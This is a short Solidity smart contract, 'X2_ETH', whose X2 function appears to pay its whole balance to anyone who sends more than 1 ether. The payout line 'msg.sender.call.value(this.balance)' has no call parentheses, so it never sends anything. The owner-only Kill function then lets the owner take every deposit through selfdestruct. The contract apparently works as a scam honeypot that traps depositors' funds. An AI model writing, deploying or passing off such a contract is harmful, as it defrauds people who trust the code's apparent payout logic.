1 pragma solidity ^0.4.19;
2 
3 contract X2_ETH  
4 {
5     address owner = msg.sender;
6     
7     function() public payable {}
8     
9     function X2()
10     public
11     payable
12     {
13         if(msg.value > 1 ether)
14         {
15             msg.sender.call.value(this.balance);
16         }
17     }
18     
19     function Kill()
20     public
21     payable
22     {
23         if(msg.sender==owner)
24         {
25             selfdestruct(owner);
26         }
27     }
28 }